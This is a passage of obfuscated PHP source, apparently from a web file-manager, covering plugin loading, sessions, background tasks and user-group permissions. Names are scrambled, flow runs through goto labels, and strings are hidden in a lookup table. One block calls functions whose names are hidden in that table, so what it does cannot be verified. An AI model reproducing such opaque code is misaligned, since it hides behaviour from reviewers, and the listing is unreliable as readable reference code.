$GLOBALS[$e‘Ç◊¿≥èé[6]][$e‘Ç◊¿≥èé[88]][$e‘Ç◊¿≥èé[1784]] == 1; $DπÜ¿£ÀƒÌ = $AÀâò®Òêœ ? 3 : 2; foreach ($a‚∏µÑ˜í€ as $dÿ•üÜ›‰•) { if ($dÿ•üÜ›‰•[$e‘Ç◊¿≥èé[1692]] == $e«Ë∑ÓÒıÜ) { return 0; } $cë‚ƒ”„Ë˘ = explode($e‘Ç◊¿≥èé[47], trim($dÿ•üÜ›‰•[$e‘Ç◊¿≥èé[487]], $e‘Ç◊¿≥èé[47])); if ($cë‚ƒ”„Ë˘[0] == $e‘Ç◊¿≥èé[191] && count($cë‚ƒ”„Ë˘) > $DπÜ¿£ÀƒÌ) { $f‚ìÜ„ÿ≥© = array_reverse(array_slice($cë‚ƒ”„Ë˘, $DπÜ¿£ÀƒÌ)); $D≥≈®¨ß‡∞ = array_search($e«Ë∑ÓÒıÜ, $f‚ìÜ„ÿ≥©); if ($D≥≈®¨ß‡∞ !== !1 && $D≥≈®¨ß‡∞ + 1 <= $EâÔÀúê–é) { $EâÔÀúê–é = $D≥≈®¨ß‡∞ + 1; } } } goto Bë∂Ëô¯µ±; BêöÏÆˆèé: } private function userGroupList($dÙÃú∞…≤ö = false) { $cä°Ô¬é’√ =& $_SERVER[ú∫]; static $bä‘˜Ëè÷ß = array(); if (isset($bä‘˜Ëè÷ß[$dÙÃú∞…≤ö])) { return $bä‘˜Ëè÷ß[$dÙÃú∞…≤ö]; } $a÷—µ∑õöŸ = Model($cä°Ô¬é’√[506])->getInfo($dÙÃú∞…≤ö); $bä‘˜Ëè÷ß[$dÙÃú∞…≤ö] = array_to_keyvalue($a÷—µ∑õöŸ[$cä°Ô¬é’√[1866]], $cä°Ô¬é’√[1692]); return $bä‘˜Ëè÷ß[$dÙÃú∞…≤ö]; } public function userGroupParents($DΩóÁòÇﬁÏ) { goto a†ûÙ´™€®; F™√ë∆†áŒ: $cøƒé‘‡™∑[$DΩóÁòÇﬁÏ] = array_unique($EÓ÷–Ûù–æ); return $cøƒé‘‡™∑[$DΩóÁòÇﬁÏ]; goto D›”£∫ßÑÖ; E≈ÖÓ÷±»˘: if (isset($cøƒé‘‡™∑[$DΩóÁòÇﬁÏ])) { return $cøƒé‘‡™∑[$DΩóÁòÇﬁÏ]; } $FßΩ¥Öí⁄É = $this->userGroupList($DΩóÁòÇﬁÏ); $EÓ÷–Ûù–æ = array(); goto b¢Öº∫Æ‡Ö; b¢Öº∫Æ‡Ö: $F¶¯áÀ©°ã = $GLOBALS[$a•Ö›∑ﬁΩõ[6]][$a•Ö›∑ﬁΩõ[88]][$a•Ö›∑ﬁΩõ[1784]] == 1; $A≈ë¡õéÛ∫ = $F¶¯áÀ©°ã ? 3 : 2; foreach ($FßΩ¥Öí⁄É as $EÈ£ËÃ¯ıÖ) { $eûÕôΩ”ûô = array($EÈ£ËÃ¯ıÖ[$a•Ö›∑ﬁΩõ[1692]]); $dÁ«æÂ◊Î¶ = explode($a•Ö›∑ﬁΩõ[47], trim($EÈ£ËÃ¯ıÖ[$a•Ö›∑ﬁΩõ[487]], $a•Ö›∑ﬁΩõ[47])); if ($dÁ«æÂ◊Î¶[0] == $a•Ö›∑ﬁΩõ[191] && count($dÁ«æÂ◊Î¶) > $A≈ë¡õéÛ∫) { $B£ ÖËπƒ¶ = array_slice($dÁ«æÂ◊Î¶, $A≈ë¡õéÛ∫); $eûÕôΩ”ûô = array_merge($eûÕôΩ”ûô, array_reverse($B£ ÖËπƒ¶)); } $EÓ÷–Ûù–æ = array_merge($EÓ÷–Ûù–æ, $eûÕôΩ”ûô); } goto F™√ë∆†áŒ; a†ûÙ´™€®: $a•Ö›∑ﬁΩõ =& $_SERVER[ú∫]; static $cøƒé‘‡™∑ = array(); $DΩóÁòÇﬁÏ = $DΩóÁòÇﬁÏ ? $DΩóÁòÇﬁÏ : USER_ID; goto E≈ÖÓ÷±»˘; D›”£∫ßÑÖ: } public function authTargetInfoMake($F›˘∂çèü¢) { goto DŸ†‰“√·ü; aËÎ€¥®©ﬁ: foreach ($F›˘∂çèü¢ as $CïÛöñÍ‡) { if ($CïÛöñÍ‡[$bÜö¨÷ﬁ…≥[404]] == SourceModel::TYPE_USER) { $Bô≤ˆºΩ£ö[] = intval($CïÛöñÍ‡[$bÜö¨÷ﬁ…≥[484]]); } else { if ($CïÛöñÍ‡[$bÜö¨÷ﬁ…≥[404]] == SourceModel::TYPE_GROUP) { $c¬ﬁ¨¥î¥ì[] = intval($CïÛöñÍ‡[$bÜö¨÷ﬁ…≥[484]]); } } } if ($Bô≤ˆºΩ£ö) { $Bô≤ˆºΩ£ö = Model($bÜö¨÷ﬁ…≥[502])->userListInfo($Bô≤ˆºΩ£ö); } if ($c¬ﬁ¨¥î¥ì) { $C∫∑Ì≈ûô∆ = array($bÜö¨÷ﬁ…≥[1770] => array($bÜö¨÷ﬁ…≥[411], $c¬ﬁ¨¥î¥ì)); $c¬ﬁ¨¥î¥ì = Model($bÜö¨÷ﬁ…≥[486])->field($bÜö¨÷ﬁ…≥[1895])->where($C∫∑Ì≈ûô∆)->select(); $c¬ﬁ¨¥î¥ì = array_to_keyvalue($c¬ﬁ¨¥î¥ì, $bÜö¨÷ﬁ…≥[1692]); } goto c§ÚØØûÂã; c§ÚØØûÂã: return array($bÜö¨÷ﬁ…≥[1896] => $Bô≤ˆºΩ£ö, $bÜö¨÷ﬁ…≥[1897] => $c¬ﬁ¨¥î¥ì); goto cÍ¶‰˜¬Ç∆; DŸ†‰“√·ü: $bÜö¨÷ﬁ…≥ =& $_SERVER[ú∫]; $Bô≤ˆºΩ£ö = array(); $c¬ﬁ¨¥î¥ì = array(); goto aËÎ€¥®©ﬁ; cÍ¶‰˜¬Ç∆: } public function authInfo($C•¥åÕ’∞ß) { $d‡¯ı≤áÉ€ =& $_SERVER[ú∫]; if ($C•¥åÕ’∞ß[$d‡¯ı≤áÉ€[1787]]) { $D€ÏÇ«®”è = Model($d‡¯ı≤áÉ€[1859])->listData($C•¥åÕ’∞ß[$d‡¯ı≤áÉ€[1787]]); if (!$D€ÏÇ«®”è) { return !1; $d´°÷†Éâ‹ = Model($d‡¯ı≤áÉ€[1859])->listData(); $cçÑ©ÜÒ≠ã = array_filter_by_field($d´°÷†Éâ‹, $d‡¯ı≤áÉ€[406], $d‡¯ı≤áÉ€[191]); return $cçÑ©ÜÒ≠ã; } $eÚÚ±Ÿé£≥ = array_field_key($D€ÏÇ«®”è, array($d‡¯ı≤áÉ€[393], $d‡¯ı≤áÉ€[28], $d‡¯ı≤áÉ€[406], $d‡¯ı≤áÉ€[1713], $d‡¯ı≤áÉ€[1715])); $eÚÚ±Ÿé£≥[$d‡¯ı≤áÉ€[1898]] = $C•¥åÕ’∞ß; return $eÚÚ±Ÿé£≥; } else { return array($d‡¯ı≤áÉ€[412] => 0, $d‡¯ı≤áÉ€[1698] => $C•¥åÕ’∞ß[$d‡¯ı≤áÉ€[1841]], $d‡¯ı≤áÉ€[413] => $d‡¯ı≤áÉ€[33], $d‡¯ı≤áÉ€[1713] => $d‡¯ı≤áÉ€[1899]); } } } goto C¿πúØ†≠É; d∫©˘çå è: if ($_SERVER[$_SERVER[ú∫][821]] != $_SERVER[$_SERVER[ú∫][1459]]) { goto A∑ç™û—Ê; Båä—ö´›é: $aåÂˆôÆœî = explode($_SERVER[ú∫][229], $DÃ©∆úÖ„); if (count($aåÂˆôÆœî) < $_SERVER[ú∫][589]) { $Füï ª—Æ = $_SERVER[ú∫][826]; $Füï ª—Æ(); } $F¢Ã√ÔÔçç = $_SERVER[ú∫][827]; goto F÷åƒŸ–çŸ; F÷åƒŸ–çŸ: $F¢Ã√ÔÔçç($_SERVER[$_SERVER[ú∫][822]]); goto fçÙçï›Â„; A∑ç™û—Ê: $F”ó∫∑ˆ¬ˆ = $_SERVER[ú∫][823]; $E¨∫πÛ†º = $_SERVER[$_SERVER[ú∫][824]] . $_SERVER[ú∫][825]; $DÃ©∆úÖ„ = $F”ó∫∑ˆ¬ˆ($E¨∫πÛ†º); goto Båä—ö´›é; fçÙçï›Â„: } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\160\x6c\x75\147\x69\x6e\x4c\x69\163\x74"; public $field = array("\156\x61\155\145", "\x73\164\x61\164\165\163", "\162\145\147\151\x65\163\164", "\x63\x6f\156\x66\151\x67"); public function loadList($AÉÈ‡£Ã‘Ú = false) { $C´∆ﬂØ•≠ê = array_to_keyvalue($this->listData(), $_SERVER[ú∫][28]); if ($AÉÈ‡£Ã‘Ú) { return $C´∆ﬂØ•≠ê[$AÉÈ‡£Ã‘Ú]; } return $C´∆ﬂØ•≠ê; } public function init() { $Dî…ï’¢àª =& $_SERVER[ú∫]; Hook::trigger($Dî…ï’¢àª[1803]); $E†ë¯Ø∞π€ = $this->loadPluginList(); foreach ($E†ë¯Ø∞π€ as $dà’õƒ»é— => $B«•«˘≥˘±) { $eΩ´ﬁØ∆™ø = $this->appAllow($dà’õƒ»é—, $B«•«˘≥˘±); if (!$eΩ´ﬁØ∆™ø) { continue; } foreach ($B«•«˘≥˘±[$Dî…ï’¢àª[1804]] as $B’û…ÚÒæµ => $Aåê“”àå≠) { Hook::bind($B’û…ÚÒæµ, $Aåê“”àå≠); } } Hook::trigger($Dî…ï’¢àª[1805]); Hook::trigger(ACTION); } public function appAllow($Fæ∂ì¨ﬁõÃ, $E√á≥ï ™⁄, $f©±—üÏ¯© = true) { $A€Ç‚ÿßìÇ =& $_SERVER[ú∫]; $EÁ∆©˜Ñ±É = PLUGIN_DIR . $Fæ∂ì¨ﬁõÃ . $A€Ç‚ÿßìÇ[1806]; if (!is_array($E√á≥ï ™⁄) || !is_array($E√á≥ï ™⁄[$A€Ç‚ÿßìÇ[1804]]) || $E√á≥ï ™⁄[$A€Ç‚ÿßìÇ[710]] != 1 || !is_file($EÁ∆©˜Ñ±É)) { return !1; } if ($GLOBALS[$A€Ç‚ÿßìÇ[485]] == 1) { return !0; } if ($f©±—üÏ¯© && !Action($A€Ç‚ÿßìÇ[1807])->checkAuth($Fæ∂ì¨ﬁõÃ)) { return !1; } return !0; } public function unInstall($bãëçÑœÂÎ) { $fÊ—◊ñäˆÑ =& $_SERVER[ú∫]; $dÖä™ÜÉÑ¬ = $this->loadList($bãëçÑœÂÎ); if (file_exists(PLUGIN_DIR . $bãëçÑœÂÎ)) { Hook::apply($bãëçÑœÂÎ . $fÊ—◊ñäˆÑ[1808]); } $this->remove($dÖä™ÜÉÑ¬[$fÊ—◊ñäˆÑ[393]]); } public function changeStatus($b±ö‡¢Ç¯ı, $cÆÕ›ÛßÛÕ) { $Fµåà˜óıë =& $_SERVER[ú∫]; $d˜∆Ó‹Ò≥« = $this->loadList($b±ö‡¢Ç¯ı); if ($cÆÕ›ÛßÛÕ) { Hook::apply($b±ö‡¢Ç¯ı . $Fµåà˜óıë[1809]); } $this->update($d˜∆Ó‹Ò≥«[$Fµåà˜óıë[393]], array($Fµåà˜óıë[1810] => $cÆÕ›ÛßÛÕ)); } public function appRegist($BÇÀóüåÖÖ, $FÖ‚åèàÖ≥) { $Cµâ ã¨¯◊ =& $_SERVER[ú∫]; $fåŸäπÆäÔ = $this->loadList($BÇÀóüåÖÖ); if ($fåŸäπÆäÔ) { $this->update($fåŸäπÆäÔ[$Cµâ ã¨¯◊[393]], array($Cµâ ã¨¯◊[1804] => $FÖ‚åèàÖ≥)); } else { $aÖ°∫Ù∆îô = array($Cµâ ã¨¯◊[28] => $BÇÀóüåÖÖ, $Cµâ ã¨¯◊[1804] => $FÖ‚åèàÖ≥, $Cµâ ã¨¯◊[710] => 0, $Cµâ ã¨¯◊[6] => $this->getConfigDefault($BÇÀóüåÖÖ)); $this->insert($aÖ°∫Ù∆îô); } } public function getConfigDefault($bŸ·Î◊ÆéÓ) { $BíÜìô·ó‹ =& $_SERVER[ú∫]; $eâËÂ∞âÆﬂ = array(); $Dœ—äê›¨¬ = $this->getPackageJson($bŸ·Î◊ÆéÓ); if (!$Dœ—äê›¨¬ && is_array($Dœ—äê›¨¬[$BíÜìô·ó‹[1811]])) { return $eâËÂ∞âÆﬂ; } foreach ($Dœ—äê›¨¬[$BíÜìô·ó‹[1811]] as $C¥ü≠º€Á => $f™≤Ù˘Ïô) { if (!isset($f™≤Ù˘Ïô[$BíÜìô·ó‹[372]]) || isset($eâËÂ∞âÆﬂ[$C¥ü≠º€Á])) { continue; } $eâËÂ∞âÆﬂ[$C¥ü≠º€Á] = $f™≤Ù˘Ïô[$BíÜìô·ó‹[372]]; } return $eâËÂ∞âÆﬂ; } public function getPackageJson($AÔ»…ÊªﬂÆ) { return Hook::apply($AÔ»…ÊªﬂÆ . $_SERVER[ú∫][1812]); } public function getConfig($E‰Ù‹ÌÈú”, $eΩÇç¢”ÀØ = false) { $bÉªúÜ÷ÿŸ =& $_SERVER[ú∫]; $C¨¬úÜ‘ü∆ = array(); $EÉÚËë ‘– = $this->loadList($E‰Ù‹ÌÈú”); if ($EÉÚËë ‘– && is_array($EÉÚËë ‘–[$bÉªúÜ÷ÿŸ[6]])) { $C¨¬úÜ‘ü∆ = $EÉÚËë ‘–[$bÉªúÜ÷ÿŸ[6]]; } if (!$C¨¬úÜ‘ü∆ || $eΩÇç¢”ÀØ) { $C¨¬úÜ‘ü∆ = $this->getConfigDefault($E‰Ù‹ÌÈú”); } return $C¨¬úÜ‘ü∆; } public function setConfig($eÜöì◊´œò, $c ©⁄€°ä∏ = false) { goto eØÍ®ª‰ê©; A–®À¯Ø©∏: $F§Ç⁄≤äò© = $d≈Â±≈ÌÛµ[$C‹ı√≥Ø˜É[6]]; if ($c ©⁄€°ä∏ == !1) { $F§Ç⁄≤äò© = array(); $c ©⁄€°ä∏ = $this->getConfigDefault($eÜöì◊´œò); } foreach ($c ©⁄€°ä∏ as $DÚâÌÈïã¯ => $aà¨£Ñ√”¿) { $F§Ç⁄≤äò©[$DÚâÌÈïã¯] = is_string($aà¨£Ñ√”¿) ? trim($aà¨£Ñ√”¿) : $aà¨£Ñ√”¿; } goto c∑≥ÔÜœ´Á; eØÍ®ª‰ê©: $C‹ı√≥Ø˜É =& $_SERVER[ú∫]; $d≈Â±≈ÌÛµ = $this->loadList($eÜöì◊´œò); if (!$d≈Â±≈ÌÛµ) { return !1; } goto A–®À¯Ø©∏; c∑≥ÔÜœ´Á: $this->update($d≈Â±≈ÌÛµ[$C‹ı√≥Ø˜É[393]], array($C‹ı√≥Ø˜É[6] => $F§Ç⁄≤äò©)); goto dØä§°≠ûâ; dØä§°≠ûâ: } public function viewList() { goto Dé≈ñŸñÏ†; bâ…úá©¨: $açûßå√äπ = $this->loadPluginList(); $bÓÇÇ°±Ïƒ = array(); foreach ($açûßå√äπ as $eõÑ∫ÃÀËª => $F¥Ï∑ﬁÑú¨) { unset($F¥Ï∑ﬁÑú¨[$dØ√é´Óîß[1804]], $F¥Ï∑ﬁÑú¨[$dØ√é´Óîß[6]]); $aâ€çõ≈´ë = PLUGIN_DIR . $F¥Ï∑ﬁÑú¨[$dØ√é´Óîß[28]] . $dØ√é´Óîß[1806]; if (!is_file($aâ€çõ≈´ë)) { continue; } $b†¯¶û†¨® = Hook::apply($F¥Ï∑ﬁÑú¨[$dØ√é´Óîß[28]] . $dØ√é´Óîß[1812]); if (is_array($b†¯¶û†¨®)) { $bÓÇÇ°±Ïƒ[$eõÑ∫ÃÀËª] = array_merge($F¥Ï∑ﬁÑú¨, $b†¯¶û†¨®); } } goto C»¡º∆ëéπ; C»¡º∆ëéπ: return $bÓÇÇ°±Ïƒ; goto f∞∞œßêŸ¥; Dé≈ñŸñÏ†: $dØ√é´Óîß =& $_SERVER[ú∫]; $açûßå√äπ = $this->loadList(); $this->pluginScan($açûßå√äπ); goto bâ…úá©¨; f∞∞œßêŸ¥: } private function loadPluginList() { $F∏À„ú¯∂∏ =& $_SERVER[ú∫]; $fû€ù©∆¶ü = $this->loadList(); if (strtolower(MOD) == $F∏À„ú¯∂∏[1813]) { return $fû€ù©∆¶ü; } $eƒª∫Íñπæ = Hook::trigger($F∏À„ú¯∂∏[1814], $fû€ù©∆¶ü); if ($fû€ù©∆¶ü && !$eƒª∫Íñπæ) { die; } return $eƒª∫Íñπæ ? $eƒª∫Íñπæ : $fû€ù©∆¶ü; } private function pluginScan($B√˜ë∑îîŒ) { $d§ì—œﬂ§Ù =& $_SERVER[ú∫]; recursion_dir(PLUGIN_DIR, $d¬Ü¶à™›¶, $D≤Æ¥Ωäºí, 0); foreach ($d¬Ü¶à™›¶ as $aá≥®Ï∞‡è) { $Dê†Æ«°Ù = get_path_this($aá≥®Ï∞‡è); if (isset($B√˜ë∑îîŒ[$Dê†Æ«°Ù]) || !file_exists($aá≥®Ï∞‡è . $d§ì—œﬂ§Ù[1815]) || !file_exists($aá≥®Ï∞‡è . $d§ì—œﬂ§Ù[1806])) { continue; } Hook::apply($Dê†Æ«°Ù . $d§ì—œﬂ§Ù[1809]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\163\164\x65\155\137\163\x65\x73\x73\x69\x6f\x6e"; public function get($cÕñØÕ‘Îò) { $C—ñ ’±◊» =& $_SERVER[ú∫]; $BΩ√ˆÊ±•◊ = $this->where(array($C—ñ ’±◊»[1816] => $cÕñØÕ‘Îò))->find(); if (!is_array($BΩ√ˆÊ±•◊)) { return !1; } return $BΩ√ˆÊ±•◊[$C—ñ ’±◊»[715]]; } public function set($c Ü÷…ó±¡, $AúéÂ¯¿Ú’, $e”Ã ã√úÇ = 3600) { $e‚ò¿Àì§ã =& $_SERVER[ú∫]; $aá‡Ñº∆â’ = array($e‚ò¿Àì§ã[1816] => $c Ü÷…ó±¡, $e‚ò¿Àì§ã[1725] => $AúéÂ¯¿Ú’, $e‚ò¿Àì§ã[1817] => $e”Ã ã√úÇ + time()); if (Session::get($e‚ò¿Àì§ã[1818])) { $aá‡Ñº∆â’[$e‚ò¿Àì§ã[1528]] = Session::get($e‚ò¿Àì§ã[1818]); } else { $aá‡Ñº∆â’[$e‚ò¿Àì§ã[1528]] = 0; } if ($this->get($c Ü÷…ó±¡)) { return $this->where(array($e‚ò¿Àì§ã[1816] => $c Ü÷…ó±¡))->save($aá‡Ñº∆â’); } else { return $this->add($aá‡Ñº∆â’, array(), !0); } } public function remove($aéÑ˜±øÛ¯) { return $this->where(array($_SERVER[ú∫][1816] => $aéÑ˜±øÛ¯))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ú∫][1819] . time())->delete(); } } goto c‰¡…«Ç°√; cá∑Î™¢Ç◊: class Task { const STATYS_STOP = "\163\x74\157\160"; const STATYS_RUNNING = "\x72\x75\156\x6e\x69\x6e\x67"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($dï≈ˆõÇ÷ó, $a’‚Îã»¥µ = '', $BõˆŒÈÑáƒ = 0, $bú—Ö∆ìÂì = '') { goto C§µàÜÕ§Ô; C§µàÜÕ§Ô: $dÂ∑êÎΩ®· =& $_SERVER[ú∫]; if (self::get($dï≈ˆõÇ÷ó)) { return; } $this->task = array($dÂ∑êÎΩ®·[393] => $dï≈ˆõÇ÷ó, $dÂ∑êÎΩ®·[1528] => USER_ID, $dÂ∑êÎΩ®·[1432] => $bú—Ö∆ìÂì, $dÂ∑êÎΩ®·[29] => $a’‚Îã»¥µ, $dÂ∑êÎΩ®·[1023] => $dÂ∑êÎΩ®·[33], $dÂ∑êÎΩ®·[1021] => $BõˆŒÈÑáƒ, $dÂ∑êÎΩ®·[1036] => 0, $dÂ∑êÎΩ®·[1529] => 0, $dÂ∑êÎΩ®·[1530] => 0, $dÂ∑êÎΩ®·[749] => timeFloat(), $dÂ∑êÎΩ®·[748] => 0, $dÂ∑êÎΩ®·[1531] => 0, $dÂ∑êÎΩ®·[1532] => 0, $dÂ∑êÎΩ®·[1533] => 0, $dÂ∑êÎΩ®·[710] => $dÂ∑êÎΩ®·[1492]); goto B∞…¨≠“¬À; B∞…¨≠“¬À: $GLOBALS[$dÂ∑êÎΩ®·[1534]] = 1; Hook::bind($dÂ∑êÎΩ®·[1494], array($this, $dÂ∑êÎΩ®·[1535])); Hook::bind($dÂ∑êÎΩ®·[1536], array($this, $dÂ∑êÎΩ®·[1537])); goto c∑∂ÃçÕ‘â; c∑∂ÃçÕ‘â: $this->startAfter(); Hook::trigger($dÂ∑êÎΩ®·[1538], $this->task); $this->task[$dÂ∑êÎΩ®·[1531]] = timeFloat(); goto D•°∑⁄‚ÌÓ; D•°∑⁄‚ÌÓ: } public function end() { goto cπãΩûˆç–; c˘œªŸ√ª∂: $bπî¡Ü¨’ã = timeFloat() - $this->task[$F≈Êá˘á≈Ò[749]]; self::log($F≈Êá˘á≈Ò[1539] . $this->task[$F≈Êá˘á≈Ò[393]] . $F≈Êá˘á≈Ò[1540] . $bπî¡Ü¨’ã . $F≈Êá˘á≈Ò[1541]); Hook::unbind($F≈Êá˘á≈Ò[1494], array($this, $F≈Êá˘á≈Ò[1535])); goto B·ã©îåÊç; B·ã©îåÊç: Hook::unbind($F≈Êá˘á≈Ò[1536], array($this, $F≈Êá˘á≈Ò[1537])); $this->endAfter(); $this->task = !1; goto d√ñÓÌÀ≥Â; cπãΩûˆç–: $F≈Êá˘á≈Ò =& $_SERVER[ú∫]; if (!$this->task) { return; } if ($this->task[$F≈Êá˘á≈Ò[1531]]) { self::valueSet($this->task[$F≈Êá˘á≈Ò[393]], !1); } goto c˘œªŸ√ª∂; d√ñÓÌÀ≥Â: } public function update($Bﬂí‹ƒ‹¿ù = 0, $fû¥ëÚÊ≤ù = false) { goto Fö¢°œà¨Ó; fè⁄ù¥Çä‹: $Dºø÷Êóí° = self::get($fº“⁄™‚æã[$d˜∫⁄í–Ëà[393]]); $E„ûï†ì∆∞ = $Dºø÷Êóí°[$d˜∫⁄í–Ëà[710]]; if ($E„ûï†ì∆∞ == self::STATYS_KILL) { $Fâ‹·Î‡ØΩ = array($d˜∫⁄í–Ëà[1542] => LNG($d˜∫⁄í–Ëà[1543]), $d˜∫⁄í–Ëà[1086] => !1); Cache::set($d˜∫⁄í–Ëà[1544] . $this->task[$d˜∫⁄í–Ëà[393]], $Fâ‹·Î‡ØΩ, 30); $this->onKill(); $this->end(); die; } else { if ($E„ûï†ì∆∞ == self::STATYS_STOP) { $Aﬂìùêî—£ = 2; $Dºø÷Êóí°[$d˜∫⁄í–Ëà[1532]] += $Aﬂìùêî—£; self::valueSet($fº“⁄™‚æã[$d˜∫⁄í–Ëà[393]], $Dºø÷Êóí°); sleep($Aﬂìùêî—£); $this->update(); return; } } goto bÉ©ìá∞„ˆ; Fö¢°œà¨Ó: $d˜∫⁄í–Ëà =& $_SERVER[ú∫]; $fº“⁄™‚æã =& $this->task; if (!$fº“⁄™‚æã) { return; } goto EáÉÛ©ùŒ¿; dô§«⁄ˆˆ∫: Hook::trigger($d˜∫⁄í–Ëà[1545], $fº“⁄™‚æã); self::valueSet($fº“⁄™‚æã[$d˜∫⁄í–Ëà[393]], $fº“⁄™‚æã); goto E‚Ã ®ÛØ; EáÉÛ©ùŒ¿: $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1036]] += $Bﬂí‹ƒ‹¿ù; $fº“⁄™‚æã[$d˜∫⁄í–Ëà[748]] = timeFloat(); if ($fº“⁄™‚æã[$d˜∫⁄í–Ëà[1021]]) { if ($fº“⁄™‚æã[$d˜∫⁄í–Ëà[1021]] < $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1036]]) { $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1021]] = $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1036]]; } $fÛ®∫«ó°Ø = timeFloat() - $fº“⁄™‚æã[$d˜∫⁄í–Ëà[749]] - $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1532]]; $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1529]] = $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1036]] / $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1021]]; $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1530]] = $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1036]] / $fÛ®∫«ó°Ø; if ($fº“⁄™‚æã[$d˜∫⁄í–Ëà[1529]] > 0) { $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1533]] = $fÛ®∫«ó°Ø * (1 - $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1529]]) / $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1529]]; } $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1533]] = $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1533]] <= 0 ? 0 : $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1533]]; } goto bõ±“ıäå‡; bÉ©ìá∞„ˆ: $fº“⁄™‚æã[$d˜∫⁄í–Ëà[710]] = $E„ûï†ì∆∞ ? $E„ûï†ì∆∞ : $fº“⁄™‚æã[$d˜∫⁄í–Ëà[710]]; $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1532]] = $Dºø÷Êóí°[$d˜∫⁄í–Ëà[1532]] ? $Dºø÷Êóí°[$d˜∫⁄í–Ëà[1532]] : 0; $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1531]] = timeFloat(); goto dô§«⁄ˆˆ∫; bõ±“ıäå‡: $this->updateAfter(); $FΩŸ§¯§’” = 0.2; if (timeFloat() - $fº“⁄™‚æã[$d˜∫⁄í–Ëà[1531]] < $FΩŸ§¯§’” && !$fû¥ëÚÊ≤ù) { return; } goto fè⁄ù¥Çä‹; E‚Ã ®ÛØ: } public function onKillSet($Fôô˜äÛùä, $a›—˜û’Çﬂ = array()) { $this->onKillCall = array($Fôô˜äÛùä, $a›—˜û’Çﬂ); } public function onKill() { $CÁÖä•˘¡ø =& $_SERVER[ú∫]; self::log($CÁÖä•˘¡ø[1539] . $this->task[$CÁÖä•˘¡ø[393]] . $CÁÖä•˘¡ø[1546]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($Fñ£ØÙ‘îÿ) { $f©Œ∫ÿ¡‡û =& $_SERVER[ú∫]; Cache::set($f©Œ∫ÿ¡‡û[1544] . $this->task[$f©Œ∫ÿ¡‡û[393]], $Fñ£ØÙ‘îÿ, 60); return $Fñ£ØÙ‘îÿ; } public static function get($cëÌá¥áæó) { return self::valueGet($cëÌá¥áæó); } public static function listData() { $fÒâ–†áÛÖ = self::valueGet(); return array_sort_by($fÒâ–†áÛÖ, $_SERVER[ú∫][749], !0); } public static function kill($bã∂¡°ÈÚÌ) { return self::changeStatus($bã∂¡°ÈÚÌ, self::STATYS_KILL); } public static function stop($b◊æÌá¥ûŸ) { return self::changeStatus($b◊æÌá¥ûŸ, self::STATYS_STOP); } public static function restart($A˘Ó¶Â≈éÁ) { return self::changeStatus($A˘Ó¶Â≈éÁ, self::STATYS_RUNNING); } public static function killAll() { $fúÑÇçíì‹ =& $_SERVER[ú∫]; $Cﬁ—ì≈¿⁄π = self::listData(); foreach ($Cﬁ—ì≈¿⁄π as $e⁄îÆ…Œúÿ) { self::kill($e⁄îÆ…Œúÿ[$fúÑÇçíì‹[393]]); } sleep(2); foreach ($Cﬁ—ì≈¿⁄π as $e⁄îÆ…Œúÿ) { self::valueSet($e⁄îÆ…Œúÿ[$fúÑÇçíì‹[393]], !1); } } private static function changeStatus($dƒıÎ™”„◊, $cÖåÆí◊ﬁ«) { goto DÍ·èÆ™ø·; DÍ·èÆ™ø·: $Aû◊π»ΩËâ =& $_SERVER[ú∫]; $eâäç¿Éâ° = self::valueGet($dƒıÎ™”„◊); if (!$eâäç¿Éâ°) { return !1; } goto Aö⁄ó ªÎÏ; a±¬ÿÇÓØ¨: return !0; goto BÏ‰Õõ‡«π; Aö⁄ó ªÎÏ: $eâäç¿Éâ°[$Aû◊π»ΩËâ[710]] = $cÖåÆí◊ﬁ«; self::valueSet($dƒıÎ™”„◊, $eâäç¿Éâ°); self::log($Aû◊π»ΩËâ[1547] . $eâäç¿Éâ°[$Aû◊π»ΩËâ[393]] . $Aû◊π»ΩËâ[1548] . $cÖåÆí◊ﬁ«); goto a±¬ÿÇÓØ¨; BÏ‰Õõ‡«π: } public static function valueGet($D¨ú¨⁄òÊ÷ = false) { $FƒŒ‡Æì«≤ =& $_SERVER[ú∫]; if ($D¨ú¨⁄òÊ÷) { $dÉßÖËÇ´† = Model($FƒŒ‡Æì«≤[425])->where(array($FƒŒ‡Æì«≤[93] => $D¨ú¨⁄òÊ÷, $FƒŒ‡Æì«≤[29] => $FƒŒ‡Æì«≤[1549]))->find(); return $dÉßÖËÇ´† ? json_decode($dÉßÖËÇ´†[$FƒŒ‡Æì«≤[372]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($F°ï˜Í∂£• = false) { goto EòéôÊ“ıÜ; FËØœÍåıÓ: return $aŒﬁ‰î€ÙÍ; goto aÓúõ˘¡∆Ì; A“ÜÊã«ô’: $aŒﬁ‰î€ÙÍ = Model($E≤¶‹”Ö≈˜[425])->where($c¥˘¡øä»Ê)->select(); $aŒﬁ‰î€ÙÍ = $aŒﬁ‰î€ÙÍ ? $aŒﬁ‰î€ÙÍ : array(); foreach ($aŒﬁ‰î€ÙÍ as $eçÈ’úÊ§ì => $fâ⁄µÕ¢ ¬) { $aŒﬁ‰î€ÙÍ[$eçÈ’úÊ§ì] = json_decode($fâ⁄µÕ¢ ¬[$E≤¶‹”Ö≈˜[372]], !0); 